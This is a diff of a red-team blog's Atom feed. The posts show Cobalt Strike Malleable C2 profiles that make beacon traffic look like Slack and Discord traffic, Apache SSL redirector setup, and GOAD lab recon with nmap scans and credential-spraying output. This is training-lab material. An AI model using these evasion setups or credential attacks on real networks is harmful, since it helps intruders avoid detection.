@@ -1,4 +1,223 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-14T11:38:12+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">RED-TEAM Home-Lab Infra</title><link href="http://localhost:4000/it/RED-TEAM-Infra/" rel="alternate" type="text/html" title="RED-TEAM Home-Lab Infra" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/it/RED-TEAM-Infra</id><content type="html" xml:base="http://localhost:4000/it/RED-TEAM-Infra/"><![CDATA[<p>After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-30T20:12:32+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="http://localhost:4000/red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+05:30</published><updated>2024-12-25T00:00:00+05:30</updated><id>http://localhost:4000/red-team/Malleable-c2-pro</id><content type="html" xml:base="http://localhost:4000/red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Beacon’s HTTP indicators are controlled by a Malleable Command and Control (Malleable C2) profile. A Malleable C2 profile is a simple program that specifies how to transform data and store it in a transaction. The same profile that transforms and stores data, interpreted backwards, also extracts and recovers data from a transaction.</p>
+
+<p>To use a custom profile, you must start a Cobalt Strike team server and specify your profile at that time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./teamserver [external IP] [password] [/path/to/my.profile]
+</code></pre></div></div>
+
+<p>You may only load one profile per Cobalt Strike instance.</p>
+
+<p>Malleable C2 is a domain specific language to redefine indicators in Beacon’s communication. This repository is a collection of Malleable C2 profiles that you may use. These profiles work with Cobalt Strike 3.x.</p>
+
+<h3 id="slack-and-discord-simulation-profiles"><strong>Slack and Discord Simulation Profiles</strong></h3>
+
+<h4 id="purpose"><strong>Purpose</strong></h4>
+<p>These profiles are designed to simulate HTTP communication patterns resembling Slack and Discord traffic. They aim to improve operational security (OPSEC) by mimicking legitimate application behavior to evade detection in network monitoring environments.</p>
+
+<hr />
+
+<ul>
+  <li>The profiles utilize dynamic URIs for both HTTP GET and POST requests.</li>
+  <li>
+    <p>A metadata block is used to prepend and append channel-specific identifiers (e.g., <code class="language-plaintext highlighter-rouge">channel-&lt;dynamic&gt;-dynamic</code>) to create the appearance of real-time channel activity.</p>
+  </li>
+  <li>HTTP GET traffic uses a Slack-specific user-agent: <code class="language-plaintext highlighter-rouge">Slack/4.23.0 (Mac OS X 10.15.7)</code>.</li>
+  <li>
+    <p>HTTP POST traffic uses a Discord-specific user-agent: <code class="language-plaintext highlighter-rouge">Discord/1.0 (Linux; Android 10; Scale/3.0)</code>.</p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">spawnto_x86</code> and <code class="language-plaintext highlighter-rouge">spawnto_x64</code> are set to <code class="language-plaintext highlighter-rouge">taskhostw.exe</code>, a legitimate Windows process, instead of the highly scrutinized <code class="language-plaintext highlighter-rouge">svchost.exe</code>.</li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">host_stage</code> parameter is disabled (<code class="language-plaintext highlighter-rouge">false</code>) to avoid exposing payloads to unauthorized parties.</p>
+  </li>
+  <li>The certificates mimic Slack and Discord services:
+    <ul>
+      <li>For Slack: <code class="language-plaintext highlighter-rouge">CN="slack.com"</code>, <code class="language-plaintext highlighter-rouge">O="Slack Technologies, LLC"</code>.</li>
+      <li>Valid for 365 days to appear realistic.</li>
+    </ul>
+  </li>
+  <li>Authorization headers include tokens (<code class="language-plaintext highlighter-rouge">Bearer &lt;bot-token&gt;</code> and <code class="language-plaintext highlighter-rouge">Bearer &lt;user-token&gt;</code>) to simulate API usage.</li>
+  <li>
+    <p>Headers like <code class="language-plaintext highlighter-rouge">Content-Type</code>, <code class="language-plaintext highlighter-rouge">Accept</code>, and <code class="language-plaintext highlighter-rouge">User-Agent</code> are customized to match Slack and Discord API patterns.</p>
+  </li>
+  <li>GET and POST responses are encoded in Base64 and prefixed with keywords (e.g., <code class="language-plaintext highlighter-rouge">response_</code>, <code class="language-plaintext highlighter-rouge">msg_send_</code>) to mimic legitimate payloads.</li>
+  <li>The traffic mimics typical JSON API responses.</li>
+</ul>
+
+<h3 class="notice--info" id="you-can-find-the-c2-profiles-in-my-github-repo-c2-profiles">You can find the C2-Profiles in my github repo: <a href="https://github.com/DcodeZero/c2-profiles/">C2-Profiles</a></h3>
+
+<hr />
+<h4 id="traffic-example"><strong>Traffic Example</strong></h4>
+<p><strong>HTTP-GET Request:</strong></p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v9/channels/channel-123456-dynamic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">slack.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;bot-token&gt;</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Slack/4.23.0 (Mac OS X 10.15.7)</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json</span>
+</code></pre></div></div>
+
+<p><strong>HTTP-POST Request:</strong></p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v9/channels/channel-123456-dynamic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">discord.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;user-token&gt;</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Discord/1.0 (Linux; Android 10; Scale/3.0)</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+</code></pre></div></div>
+<hr />
+
+<h4 id="real-time-example">Real Time Example:</h4>
+
+<p>Once the profile is loaded with cobalt-strike. Create a listner with port 80. The reason to use port 80 is just for demonstration purposes.</p>
+
+<h4 id="listner-config">listner config</h4>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/2.png" alt="2.png" /></p>
+
+<h4 id="beacon-call-back-from-victim">Beacon call back from victim</h4>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/1.png" alt="1.png" /></p>
+
+<p>Open wireshark on the victim machine and check for traffic.</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/3.png" alt="3.png" /></p>
+
+<p>Select the destination address and port number.</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/4.png" alt="4.png" /></p>
+
+<p>right click and check for follow TCP-stream</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/5.png" alt="5.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[Hide from blue team like a pro by using malleable c2 profiles.]]></summary></entry><entry><title type="html">Cobalt Strike Redirectors using Apache-SSL</title><link href="http://localhost:4000/red-team/redirectors/" rel="alternate" type="text/html" title="Cobalt Strike Redirectors using Apache-SSL" /><published>2024-12-19T00:00:00+05:30</published><updated>2024-12-19T00:00:00+05:30</updated><id>http://localhost:4000/red-team/redirectors</id><content type="html" xml:base="http://localhost:4000/red-team/redirectors/"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Redirectors are systems designed to proxy traffic from a target network to private attack infrastructure. They play a vital role in ensuring operational security and serve several key purposes:</p>
+
+<h4 id="1-preventing-unauthorized-access"><strong>1. Preventing Unauthorized Access</strong></h4>
+<p>Redirectors act as a shield, preventing unauthorized parties from accessing the underlying attack infrastructure. They can:<br />
+Only allow authorized users or systems to connect to the actual infrastructure.<br />
+Make the infrastructure appear harmless or unrelated to its real purpose, deterring unwanted attention.</p>
+
+<h4 id="2-shaping-how-the-infrastructure-appears"><strong>2. Shaping How the Infrastructure Appears</strong></h4>
+<p>Redirectors control how the target perceives the infrastructure by:<br />
+Modifying content, headers, or other elements to make traffic appear legitimate and unsuspicious.<br />
+Mimicking well-known platforms or architectures to blend in and avoid detection.</p>
+
+<h4 id="3-safeguarding-the-attack-chain"><strong>3. Safeguarding the Attack Chain</strong></h4>
+<p>By acting as a buffer, redirectors help ensure that the overall attack chain remains intact, even if a part of it is exposed. They achieve this by:<br />
+Keeping different parts of the infrastructure separate to minimize the risk of exposure.<br />
+Hiding communication patterns to make it harder to trace or identify the destination.<br />
+Providing a way to swiftly redirect traffic to backup systems if a redirector is compromised.</p>
+
+<p>In red team operations, penetration testing, or other offensive security scenarios, redirectors are essential. They offer a blend of protection, control, and flexibility, making them a cornerstone of effective attack frameworks.</p>
+
+<h3 id="4-cobalt-strike-redirectors-using-apache-ssl"><strong>4. Cobalt Strike Redirectors using Apache-SSL</strong></h3>
+
+<h2 id="step--01">Step – 01</h2>
+
+<p>On the cobalt strike team server, we’ve to generate two files. <code class="language-plaintext highlighter-rouge">public.crt</code> and <code class="language-plaintext highlighter-rouge">private.key</code>.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key</code></p>
+
+<p>Once the command is executed,  you will be presented with the below prompts.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Country Name (2 letter code) [AU]: 
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]: 
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []: 172.16.100.3
+Email Address []:
+</code></pre></div></div>
+
+<p>Here the common name can be the domain you own. for my case I’m just using the ip of my teamserver.</p>
+
+<p><img src="/assets/images/sample/homelab/cobaltstrike/Pasted%20image%2020241218083534.png" alt="Pasted image 20241218083534.png" /></p>
+
+<p>now copy both the files from your teamsever to the redirector machines <code class="language-plaintext highlighter-rouge">/etc/apache2/ssl</code> 
+by creating an ssl folder.</p>
+
+<h2 id="step--02">Step – 02</h2>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo apt install apache2</code></p>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo a2enmod ssl rewrite proxy proxy_http</code></p>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1:~# mkdir -p /etc/apache2/ssl</code></p>
+<p><img src="/assets/images/sample/homelab/cobaltstrike/Pasted%20image%2020241218080922.png" alt="Pasted image 20241218080922.png" /></p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo nano /etc/apache2/sites-available/default-ssl.conf</code></p>
+<p><img src="/assets/images/sample/homelab/cobaltstrike/Pasted%20image%2020241218081757.png" alt="Pasted image 20241218081757.png" /></p>
+
+<p>Example of default-ssl.conf</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_ssl.c&gt;
+    &lt;VirtualHost *:443&gt;
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        
+        SSLEngine on
+        SSLProxyEngine on
+        SSLProxyCheckPeerCN off
+        SSLCertificateFile /etc/apache2/ssl/Your-Team-server.crt
+        SSLCertificateKeyFile /etc/apache2/ssl/Your-Team-server.key
+        
+        &lt;Directory /var/www/html&gt;
+            Options Indexes FollowSymLinks MultiViews
+            AllowOverride All
+            Require all granted
+        &lt;/Directory&gt;
+        
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+    &lt;/VirtualHost&gt;
+&lt;/IfModule&gt;
+</code></pre></div></div>
+
+<p>Make sure to have these in the default-ssl.conf
+<code class="language-plaintext highlighter-rouge">SSLEngine on</code>
+<code class="language-plaintext highlighter-rouge">SSLProxyEngine on</code>
+<code class="language-plaintext highlighter-rouge">SSLProxyCheckPeerCN off</code></p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo systemctl restart apache2</code></p>
+
+<p>Now open a browser and open https://redirector1. you should see apache now running with <code class="language-plaintext highlighter-rouge">SSL</code>.</p>
+
+<p><img src="/assets/images/sample/homelab/cobaltstrike/Pasted%20image%2020241218082902.png" alt="Pasted image 20241218082902.png" /></p>
+
+<p>Quick thing to check in here if you’ve the right certificate is that by checking the cert. your should see your <code class="language-plaintext highlighter-rouge">team-server</code> ip or the <code class="language-plaintext highlighter-rouge">FQDN</code> in the certificate.</p>
+
+<p><img src="/assets/images/sample/homelab/cobaltstrike/Pasted%20image%2020241218084951.png" alt="Pasted image 20241218084951.png" /></p>
+
+<h2 id="step--03">Step – 03</h2>
+
+<p>Now for the team-sever to communicate with our apache ssl. As <code class="language-plaintext highlighter-rouge">cobalt-strike</code> is written in java, the public certificate and private key need to be imported into a Java KeyStore.</p>
+
+<p>First, we need to combine the separate public and private files into a single PKCS12 file.  Set the password to anything you want, but remember it.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserevr: openssl pkcs12 -inkey private.key -in public.crt -export -out tserver.pkcs12</code></p>
+
+<p>You will be prompter to enter password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre></div></div>
+
+<p>Do enter the password you can remember. Once done, you’ll see a file called <code class="language-plaintext highlighter-rouge">tserver.pkcs12</code></p>
+
+<p>That PKCS12 file can then be converted to a Java KeyStore using the <code class="language-plaintext highlighter-rouge">keytool</code> utility.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserevr: keytool -importkeystore -srckeystore tserver.pkcs12 -srcstoretype pkcs12 -destkeystore tserver.store</code></p>
+
+<p>You’ll be prompted asking to enter the password. You can use the same password as before. make sure you remember it as we’ll be using it in the <code class="language-plaintext highlighter-rouge">Malleable-C2-Profiles</code>.</p>
+
+<p>The password of this new store can be the same or different.  At this point, the <code class="language-plaintext highlighter-rouge">.pkcs12</code> file can be deleted.  The new Java KeyStore needs to be referenced in a Malleable C2 profile before it can be used.</p>
+
+<p>https-certificate {
+     set keystore “tserver.store”;
+     set password “password”;
+}</p>
+
+<p>The Cobalt Strike Team Server expects the KeyStore to be in the same directory as itself.  Launch the Team Server with the updated profile.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry><entry><title type="html">Game of Active Directory - Part 3 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p3/" rel="alternate" type="text/html" title="Game of Active Directory - Part 3 [Recon]" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p3</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p3/"><![CDATA[]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Drirectory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">RED-TEAM Home-Lab Infra</title><link href="http://localhost:4000/red-team/RED-TEAM-Infra/" rel="alternate" type="text/html" title="RED-TEAM Home-Lab Infra" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/red-team/RED-TEAM-Infra</id><content type="html" xml:base="http://localhost:4000/red-team/RED-TEAM-Infra/"><![CDATA[<p>After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.</p>
 
 <p>Taking the advantage from the experience of creating a home lab environment, using multiple hypervisors and networking. I decided to have my own infrastructure in my home lab. This home lab will contain a lot of things that will be related to starting from..</p>
 
@@ -83,102 +302,13 @@
   <li>SCCM -&gt; <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code></li>
 </ol>
 
-<blockquote>
+<blockquote class="notice--info">
   <p>So now the question is how to setup this using <code class="language-plaintext highlighter-rouge">pfsense</code>?</p>
 </blockquote>
 
 <p>The above networking is achieved by setting up multiple V-LANS in <code class="language-plaintext highlighter-rouge">PFSense</code> firewall and adding firewall rules. Also, will be covering the networking part of the story using <code class="language-plaintext highlighter-rouge">PFSense</code>. The story kept for some other day.</p>
 
-<h3 id="stay-tuned-for-the-upcoming-blog">Stay tuned for the upcoming blog!!</h3>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[How to Setup a Red-Teams infrastructure at Home]]></summary></entry><entry><title type="html">Game of Active Directory - Part 1 - [Basic]</title><link href="http://localhost:4000/goad/GOAD-p1/" rel="alternate" type="text/html" title="Game of Active Directory - Part 1 - [Basic]" /><published>2024-12-02T00:00:00+05:30</published><updated>2024-12-02T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p1</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p1/"><![CDATA[<h2 id="setting-up-a-lab-for-active-directory-hacking-an-introduction">Setting Up a Lab for Active Directory Hacking: An Introduction</h2>
-
-<p>Embarking on this journey is both exciting and challenging. This series will walk you through the process of building a robust lab environment for exploring and testing security concepts, specifically in Active Directory (AD) hacking. Given the complexity and breadth of the topic, I’ve divided the series into multiple detailed parts, ensuring that each step is well-explained and manageable.</p>
-
-<h3 id="series-overview">Series Overview</h3>
-
-<p>This series will include several phases, from setting up the lab infrastructure to hands-on enumeration and hacking. Here’s a glimpse of what’s to come:</p>
-
-<ol>
-  <li><strong>Infrastructure Setup</strong>
-    <ul>
-      <li>Identifying the required hardware.</li>
-      <li>Selecting and configuring the hypervisor.</li>
-      <li>Setting up network infrastructure for seamless connectivity.</li>
-      <li>Installing essential software tools.</li>
-      <li>Creating and configuring virtual machines.</li>
-      <li>Automating deployment using scripts.</li>
-      <li>Validating the network connections and overall setup.</li>
-    </ul>
-  </li>
-  <li>
-    <p><strong>Enumeration of the Domain Infrastructure</strong><br />
-Exploring tools and techniques for mapping out the domain environment.</p>
-  </li>
-  <li>
-    <p><strong>Reconnaissance and Scanning</strong><br />
-Techniques for discovering vulnerabilities and gathering actionable data.</p>
-  </li>
-  <li>
-    <p><strong>Domain User Entry Points</strong><br />
-Identifying methods to gain user-level access to the domain.</p>
-  </li>
-  <li>
-    <p><strong>Post-Access Enumeration</strong><br />
-Using acquired credentials to dig deeper into the domain.</p>
-  </li>
-  <li><strong>And Beyond!</strong><br />
-Other exciting aspects we’ll uncover along the way.</li>
-</ol>
-
-<hr />
-
-<h3 id="starting-with-the-basics">Starting with the Basics</h3>
-
-<p>At this point, I’m still learning and figuring out how to navigate and exploit an Active Directory environment. However, setting up the lab itself has been a significant milestone. It’s taken me a few weeks to get everything up and running, and I’m excited to share my journey with you.</p>
-
-<p>In upcoming posts, I’ll dive into the <strong>infrastructure setup</strong> and share detailed steps, configurations, and challenges I faced. Whether you’re new to this or looking for insights to refine your own setup, there’s something here for everyone.</p>
-
-<hr />
-
-<h3 id="understanding-the-lab-environment">Understanding the Lab Environment</h3>
-
-<p>Before diving into configurations, let’s explore the lab structure and tools. The network diagram below offers a comprehensive view of the lab architecture:</p>
-
-<p><img src="https://github.com/Orange-Cyberdefense/GOAD/blob/main/docs/img/diagram-GOADv3-full.png?raw=true" alt="Network Diagram" /></p>
-
-<p>There are multiple versions of the GOAD lab available, but I recommend starting with the <strong>FULL GOAD lab</strong> if your hardware allows it. It provides a complete environment for exploring all aspects of AD security.</p>
-
-<p><img src="https://github.com/Orange-Cyberdefense/GOAD/raw/main/docs/img/goad_screenshot.png" alt="GOAD Lab Screenshot" /></p>
-
-<p>For this series, I’ll be using <strong>Proxmox</strong> as the primary hypervisor and building everything from scratch.</p>
-
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQejFqhECNVa7qho8EG-6ME84L0Ss1REHczjyyeCUnhJYUmn9M4ONPjXhLfnKKEgKxYH8&amp;usqp=CAU" alt="Proxmox Interface" /></p>
-
-<hr />
-
-<h3 id="dual-approach-to-learning">Dual Approach to Learning</h3>
-
-<p>To cater to diverse interests and expertise levels, the blog series will have two parallel tracks:</p>
-
-<ol>
-  <li>
-    <p><strong>IT Lab Setup</strong><br />
-Focused on the technical configurations, hardware requirements, and network setup.</p>
-  </li>
-  <li>
-    <p><strong>Walkthrough of the Lab</strong><br />
-A step-by-step exploration of domain enumeration, reconnaissance, and exploitation techniques.</p>
-  </li>
-</ol>
-
-<hr />
-
-<h3 id="stay-tuned">Stay Tuned</h3>
-
-<p>This is just the beginning! The next post will cover the <strong>infrastructure setup</strong> in detail, including hardware choices, hypervisor installation, and initial configurations.</p>
-
-<p>Whether you’re setting up your first lab or expanding your knowledge, there’s much to learn and discover. Stay tuned for more updates, and let’s embark on this exciting journey together!</p>
-
-<hr />]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Game of Active Directory - Part 2 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p2/" rel="alternate" type="text/html" title="Game of Active Directory - Part 2 [Recon]" /><published>2024-12-02T00:00:00+05:30</published><updated>2024-12-02T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p2</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p2/"><![CDATA[<h2 id="enumerate-network">Enumerate Network</h2>
+<h3 id="stay-tuned-for-the-upcoming-blog">Stay tuned for the upcoming blog!!</h3>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[How to Setup a Red-Teams infrastructure at Home]]></summary></entry><entry><title type="html">Game of Active Directory - Part 2 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p2/" rel="alternate" type="text/html" title="Game of Active Directory - Part 2 [Recon]" /><published>2024-12-07T00:00:00+05:30</published><updated>2024-12-07T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p2</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p2/"><![CDATA[<h2 id="enumerate-network">Enumerate Network</h2>
 <p>We’ll start enumerating the network</p>
 <h3 id="nmap-scanning-the-whole-ad-range">Nmap Scanning the whole AD range</h3>
 
@@ -192,6 +322,8 @@ A step-by-step exploration of domain enumeration, reconnaissance, and exploitati
   <li>172.16.100.22 -SRVC-02 <code class="language-plaintext highlighter-rouge">castelblack.north.sevenkingdoms.local</code></li>
   <li>172.16.100.23 -SRVC-03 <code class="language-plaintext highlighter-rouge">braavos.essos.local</code></li>
 </ol>
+
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-pnsv.png" alt="SCR-20241208-pnsv.png" /></p>
 
 <h4 id="scan-results-from-kingslandingsevenkingdomslocal-1721610050">Scan results from <code class="language-plaintext highlighter-rouge">kingslanding.sevenkingdoms.local</code> [172.16.100.50]</h4>
 
@@ -601,7 +733,7 @@ sql_svc
 
 <p>Passwords in description:</p>
 
-<p>![[SCR-20241208-sltp.png]]</p>
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-sltp.png" alt="SCR-20241208-sltp.png" /></p>
 
 <p>Username: [samwell.tarly] Samwell Tarly 
 Password: Heartsbane</p>
@@ -683,7 +815,106 @@ SMB         172.16.100.50   445    KINGSLANDING     [-] sevenkingdoms.local\Bran
 SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\Brandon.stark:iseedeadpeople 
 SMB         172.16.100.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\Brandon.stark:iseedeadpeople 
 SMB         172.16.100.103  445    COMMANDO         [-] commando\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
-</code></pre></div></div>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Mind Map for Active Directory - Pentesting</title><link href="http://localhost:4000/goad/mindmap/" rel="alternate" type="text/html" title="Mind Map for Active Directory - Pentesting" /><published>2024-11-13T00:00:00+05:30</published><updated>2024-11-13T00:00:00+05:30</updated><id>http://localhost:4000/goad/mindmap</id><content type="html" xml:base="http://localhost:4000/goad/mindmap/"><![CDATA[<h1 id="active-directory-mindmap-for-beginers">Active Directory MindMap For Beginers:</h1>
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Note: I tried using evil-winrm with the cracked credentials to login into all the three machines but not success.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/images/sample/GOAD/Pasted image 20241208225806.png" alt="Pasted image 20241208225806.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Game of Active Directory - Part 1 - [Basic]</title><link href="http://localhost:4000/goad/GOAD-p1/" rel="alternate" type="text/html" title="Game of Active Directory - Part 1 - [Basic]" /><published>2024-12-02T00:00:00+05:30</published><updated>2024-12-02T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p1</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p1/"><![CDATA[<h2 id="setting-up-a-lab-for-active-directory-hacking-an-introduction">Setting Up a Lab for Active Directory Hacking: An Introduction</h2>
+
+<p>Embarking on this journey is both exciting and challenging. This series will walk you through the process of building a robust lab environment for exploring and testing security concepts, specifically in Active Directory (AD) hacking. Given the complexity and breadth of the topic, I’ve divided the series into multiple detailed parts, ensuring that each step is well-explained and manageable.</p>
+
+<h3 id="series-overview">Series Overview</h3>
+
+<p>This series will include several phases, from setting up the lab infrastructure to hands-on enumeration and hacking. Here’s a glimpse of what’s to come:</p>
+
+<ol>
+  <li><strong>Infrastructure Setup</strong>
+    <ul>
+      <li>Identifying the required hardware.</li>
+      <li>Selecting and configuring the hypervisor.</li>
+      <li>Setting up network infrastructure for seamless connectivity.</li>
+      <li>Installing essential software tools.</li>
+      <li>Creating and configuring virtual machines.</li>
+      <li>Automating deployment using scripts.</li>
+      <li>Validating the network connections and overall setup.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Enumeration of the Domain Infrastructure</strong><br />
+Exploring tools and techniques for mapping out the domain environment.</p>
+  </li>
+  <li>
+    <p><strong>Reconnaissance and Scanning</strong><br />
+Techniques for discovering vulnerabilities and gathering actionable data.</p>
+  </li>
+  <li>
+    <p><strong>Domain User Entry Points</strong><br />
+Identifying methods to gain user-level access to the domain.</p>
+  </li>
+  <li>
+    <p><strong>Post-Access Enumeration</strong><br />
+Using acquired credentials to dig deeper into the domain.</p>
+  </li>
+  <li><strong>And Beyond!</strong><br />
+Other exciting aspects we’ll uncover along the way.</li>
+</ol>
+
+<hr />
+
+<h3 id="starting-with-the-basics">Starting with the Basics</h3>
+
+<p>At this point, I’m still learning and figuring out how to navigate and exploit an Active Directory environment. However, setting up the lab itself has been a significant milestone. It’s taken me a few weeks to get everything up and running, and I’m excited to share my journey with you.</p>
+
+<p>In upcoming posts, I’ll dive into the <strong>infrastructure setup</strong> and share detailed steps, configurations, and challenges I faced. Whether you’re new to this or looking for insights to refine your own setup, there’s something here for everyone.</p>
+
+<hr />
+
+<h3 id="understanding-the-lab-environment">Understanding the Lab Environment</h3>
+
+<p>Before diving into configurations, let’s explore the lab structure and tools. The network diagram below offers a comprehensive view of the lab architecture:</p>
+
+<p><img src="https://github.com/Orange-Cyberdefense/GOAD/blob/main/docs/img/diagram-GOADv3-full.png?raw=true" alt="Network Diagram" /></p>
+
+<p>There are multiple versions of the GOAD lab available, but I recommend starting with the <strong>FULL GOAD lab</strong> if your hardware allows it. It provides a complete environment for exploring all aspects of AD security.</p>
+
+<p><img src="https://github.com/Orange-Cyberdefense/GOAD/raw/main/docs/img/goad_screenshot.png" alt="GOAD Lab Screenshot" /></p>
+
+<p>For this series, I’ll be using <strong>Proxmox</strong> as the primary hypervisor and building everything from scratch.</p>
+
